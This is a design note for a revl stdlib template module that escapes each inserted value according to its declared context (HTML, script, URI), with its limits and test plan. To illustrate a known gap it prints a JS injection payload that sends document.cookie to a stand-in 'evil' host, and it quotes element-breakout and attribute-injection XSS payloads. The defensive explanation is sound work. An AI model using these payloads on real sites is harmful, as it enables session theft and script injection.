# 459 - external asset references and context-scoped templates

**Roadmap:** item 459 (issue #722), part of the 462 web-platform arc ·
**Builds on:** docs/design/526-webui-asset-alignment.md,
docs/design/530-webui-entry-surface.md,
docs/design/525-webapp-slice4-frontend.md ·
**Status:** STAGE 1 LANDED (templates + context-scoped escaping) · WEBUI ASSET MODEL + TYPED CHANNEL LANDED (F5, F7) · REMAINDER NAMED BELOW · FULL CLOSE 462-GATED

## Purpose

Item 459 (`docs/v2.0-roadmap.md:5171`) asks for first-class frontend asset
integration: a revl source names external asset files instead of carrying their
bytes in a string literal, reusable templates escape each insertion for the
context it lands in, output maps back to the original asset, and normal JS/TS
tooling stays in play behind a clean typed boundary.

The issue text is **partly stale**. Three pieces of item 459 have already landed
on main, each with its own guard suite:

| landed | what it pins | guard |
| --- | --- | --- |
| `stdlib/escape.rvl` | the three context escapers as a named surface: `escape_html`, `escape_js`, `escape_uri` | `tests/test_escape_stdlib.py` |
| `examples/webui-entry/console.rvl` | the frontend is contributed as external asset PATHS through a typed `requires webui: WebUI` coeffect, with zero inline HTML/CSS/JS in the artifact | `tests/test_webui_entry_asset_ref_459.py` |
| `examples/app/frontend/` | a real Vite/Vue frontend next to a revl service, with a source map | `tests/test_app_frontend_725.py` |

So "no JS extracted from revl strings" and "the frontend is a real TS project"
are already the shipped shape, and `docs/design/526` already argues revl must
bind to Cordis WebUI rather than grow a console framework. What is genuinely
missing is the **consumer** of the escapers and the resolution of an asset
**path** into an asset **file**.

## The gap (measured, not assumed)

1. **Nothing resolves an asset path to a file at build time.** In
   `examples/webui-entry/console.rvl:46-60` the entry's `dev_source` and
   `prod_manifest` are bare `Str` parameters. They name files; the toolchain
   never opens them, never hashes them, and never fails when they are absent or
   outside the tree. The compiler-side precedent for doing this properly already
   exists and is unused here: `src/revl/hostref.py` (design note
   `docs/design/396-host-code-file-reference.md`, option B) resolves a declared
   path relative to the declaring `.rvl`, jails it to the root tree, and pins
   its content by sha256. That machinery is for host CODE files, not for CSS/JS/
   template ASSETS, and nothing in the asset lane reaches it.
2. **No template machinery exists at all.** There is no `{{ ... }}` scanner, no
   insertion-site model and no caller-facing template API anywhere in
   `stdlib/`, `src/revl/` or `examples/`. `stdlib/escape.rvl` names the escapers
   but leaves the choice of WHICH escaper applies at each site to a human
   reading the markup, which is precisely the decision that has to be made once,
   at the site, and then be non-optional.
3. **No typed handle for an asset or a template value.** With only `Str` in the
   boundary, a path that was never resolved and a path that was resolved look
   identical, and a value that was escaped and one that was not look identical.

## Stage 1 (this change): context-scoped templates

`stdlib/template.rvl` closes gap 2 and the template half of gap 3, with the
escaping being the security-relevant part.

A template writes the context of every insertion site next to the site. A
template is an ordinary `Str`, so one function returning three of them is a
whole program:

```revl
fn page_templates() -> List[Str] {
  return [
    '<h1>{{html:title}}</h1>',
    '<script>boot("{{script:token}}");</script>',
    '<a href="/n/{{uri:slug}}">open</a>',
  ]
}
```

`scan` turns a template into `Hole` records, `escape_for` is the context to
escaper table, and `render` binds a `List[Binding]` to the holes and escapes
each value for its own hole's context. The properties that make it worth
landing:

- **The escaping rule is chosen by the insertion context.** `html` uses the
  entity encoder, `script` the JS string-literal encoder that closes the
  `</script>` element breakout, `uri` the RFC-3986 component encoder. The same
  bytes render differently in different contexts, and a test pins exactly that.
- **Wrongly-contextual insertion is refused or neutralised.** An unknown context
  is an `Err`, never a silent fall-through to some default escaper. A hole name
  must be a bare identifier, so `{{&x}}`, `{{{x}}}`, `{{x|raw}}` and `{{ x }}`
  are all refused: there is no raw/no-escape insertion form to forget to avoid.
- **The call is not ambiguous about what it inserts.** A hole with no bound
  value is an `Err` (no empty default), and a name bound twice is an `Err` (no
  scan-order tiebreak), so "which value landed here" is always answerable.
- **Origin groundwork.** Each `Hole` carries `start`/`end`, the **codepoint**
  offsets of the whole hole in the template, so `tpl.slice(start, end)` is the
  hole exactly on every tier (a byte slice would mis-slice every non-ASCII
  template). That is what a later stage needs to map generated
  output back to an insertion site in the original file.
- **Pure revl, every tier.** The module is built on the base `Str`/`Int` surface
  plus the three escapers, introduces no externs, and so lowers on every backend
  the day it lands, `wasm` included.

### The context table

| context | site | escaper | what it stops |
| --- | --- | --- | --- |
| `html` | element text, or a quoted attribute value | `escape_html` | tag and attribute breakout (`& < > " '`) |
| `script` | inside a **double-quoted** `<script>` JS string literal | `escape_js` | `</script>` and `<!--` element breakout, double-quote and line-terminator breakout |
| `uri` | a URL component (`href`, `src`, a query value) | `escape_uri` | component breakout (`/`, `?`, `&`, `#`, `%`, space, and multi-byte bytes) |

`html` and a quoted attribute deliberately share one escaper: the five characters
`escape_html` encodes are the same five that matter in both, so a second rule
would be a second thing to get wrong. The context that proves the rule is chosen
per site is `uri`, where the required encoding is genuinely different, and that
is what the tests pin. An unquoted attribute is not a supported context: it has
no encoding that does not need the quotes, so the template must quote it (which
is a property of the template, and is checked by nothing here; the template
author writes `attr="{{html:x}}"`).

## Design decisions and rejected alternatives

- **A new module rather than extending `stdlib/escape.rvl`.** The escapers are a
  reusable primitive with their own guard suite; the template engine is a
  consumer with its own failure modes (malformed holes, unbound names,
  duplicate names). Mixing them would make every future escaper change a
  template change. Adding a public stdlib module bumps the version stamp
  (`stdlib/version.rvl`, roadmap item 389), which is done in this change.
- **Declared context, not inferred context.** A template says which context a
  hole is in; the module does not try to find where an attribute or a script
  element ends. Inferring context means parsing HTML, and an HTML parser that is
  wrong about where a tag ends is an escaping bug, not a rendering bug. The
  limit this leaves is explicit and pinned by a test: a hole whose declared
  context is a *known* context but not the site's real one is not detected,
  because detecting it is the HTML parse this module refuses to do. What the
  module guarantees is the other half of the property: escaping is never
  optional, and a context outside the closed set is refused rather than
  defaulted. Concretely, the `script` row above is scoped to a **double-quoted**
  JS string literal, because `escape_js` deliberately leaves the single quote
  alone (`stdlib/escape.rvl:121-122`). Declaring `script` *correctly* at a
  **single-quoted** JS literal site therefore still breaks out of it:

  ```revl
  render_one("<script>const cfg = '{{script:v}}';</script>", "v",
             "';fetch('//evil/'+document.cookie)//")
  // -> <script>const cfg = '';fetch('//evil/'+document.cookie)//';</script>
  ```

  That is live JS injection, not a rendering artifact: the payload closes the
  literal and runs. Closing it needs a JS-string escaper parameterised by the
  quoting character, which this stage does not have; until it does, a
  `{{script:...}}` hole must land in a double-quoted literal.
- **`Result` for every failure, no `fail`.** A malformed template and an unbound
  hole are ordinary outcomes of rendering data that the program did not author,
  so they travel as values. `Err.code` is a stable token (`malformed-hole`,
  `unknown-context`, `unknown-binding`, `duplicate-binding`) a caller can branch
  on.
- **Escape values, not templates.** The template text passes through unchanged;
  only inserted values are escaped. An escaped template is a template whose
  markup has been corrupted.
- **Rejected: build the loader here too.** A disk-backed `asset.rvl` (resolve,
  jail, hash, read) is the other half of item 459 and needs the file-reference
  machinery plus a per-tier host body. Landing it inside the template change
  would make the security-relevant escaping untestable in isolation and would
  tie a pure module to the tiers that have a filesystem. It is stage 2 below.

## Deliberately deferred (named so the remainder is not mistaken for done)

- **F1 - disk-backed asset references.** A revl source resolving an asset file
  (CSS/JS/template) at build time, jailed to the root tree and content-pinned by
  sha256, reusing the `src/revl/hostref.py` resolution and jail rather than
  inventing a second one. This is what makes `dev_source`/`prod_manifest` in
  `examples/webui-entry/console.rvl` typed handles instead of `Str`, and it is
  the next slice of this item.
- **F2 - real source maps.** `Hole.start`/`Hole.end` are the groundwork. Mapping
  an insertion site back to a line/column in the original asset file, and
  feeding that into a bundler's source map so the browser devtools point at the
  original, is not done here.
- **F3 - template control flow.** `{{if}}`, `{{for}}`, includes, layout
  inheritance, blocks and a per-directory default context. Every hole is
  explicit and flat in stage 1.
- **F4 - the exemplary app.** Issue #725 (blocked on #724) and the slice-4
  frontend gap G3 (`docs/design/525-webapp-slice4-frontend.md`). Item 459's
  stated exit is app-gated on 462 and cannot close before it.
- **F5 - the typed reactive-state/RPC contract. LANDED.** Decision B of
  `docs/design/530-webui-entry-surface.md`, folded into item 457 and shipped as
  457 slice S4: `add_entry` takes a `data` parameter whose type is a declared
  record (the reactive state), the RPC surface is the component's declared
  provisions, and `revl export client --lang ts --face webui --component NAME`
  projects both into the TypeScript the browser reads with `useRpc<T>()`.
- **F6 - tiers.** Anything disk-backed (F1) will start at `py`/`ts`, the
  precedent set by `stdlib/fs.rvl` and `stdlib/shell.rvl`. `stdlib/template.rvl`
  itself is pure and is not tier-limited.
- **F7 - a `--face webui` CLI verb. LANDED.** `revl export client --lang ts
  --face webui --component NAME` renders a component's channel contract. It emits
  no ASSET: the entry is still contributed through the coeffect, and the verb
  projects the typed channel the assets consume.

## What stage 1 does not claim

Stage 1 does not read a template from disk, does not emit a source map, and does
not add a typed asset handle at the toolchain boundary. It makes the
insertion-site model and its per-context escaping rule a landed, tested,
app-neutral primitive, which is the thing F1, F2 and F4 consume. The webui asset
model and the typed channel (F5, F7) are a separate landed slice on top of it;
what they still do not claim is F1's typed handles and F2's insertion-site map.

## Verification

`tests/test_template_stdlib.py` compiles a consumer that reaches the module
through `use`, pins the public surface and the absence of externs, runs the
emitted Python and calls the module directly, and pins the refusals (raw forms,
malformed holes, unknown contexts, unbound and duplicated names) next to a
neutering proof that shows the naively spliced and the wrongly-contextual
outputs are exploitable while the shipped path is not. In the real output, for
the payload `</script><img src=x onerror=alert(1)><!--` the shipped module emits
`\u003C/script\u003E\u003Cimg src=x onerror=alert(1)\u003E\u003C!--`, while the
same call against a module whose escaper table returns its argument unchanged
emits the payload verbatim (an element breakout), and the same escaper at a
single-quoted attribute site emits `' onmouseover=alert(1) x='` verbatim (an
attribute injection).

The proof is committed, not described:
`test_every_neutering_is_caught_by_the_committed_checks` is parametrised over
sixteen source mutations (the escaper table returning its argument, the context
gates removed, each escaper replaced by each other escaper), rewrites
`stdlib/template.rvl` and `stdlib/escape.rvl` into `tmp_path` and recompiles
from there — so a mutation reaches the layer the checks execute — and fails if
the security checks do not notice. `test_the_proof_has_a_baseline_the_shipped_module_passes_every_check`
is the other half: with no mutation every check holds, so "the checks failed" is
only meaningful evidence against a green baseline. The wrongly-contextual half
is pinned directly by `test_the_context_choice_is_load_bearing` (using `script`
at an attribute site is a breakout) and by
`test_a_wrong_declaration_is_an_author_error_the_module_documents_not_catches`
(the declaration is intent; the module does not check it against the markup).
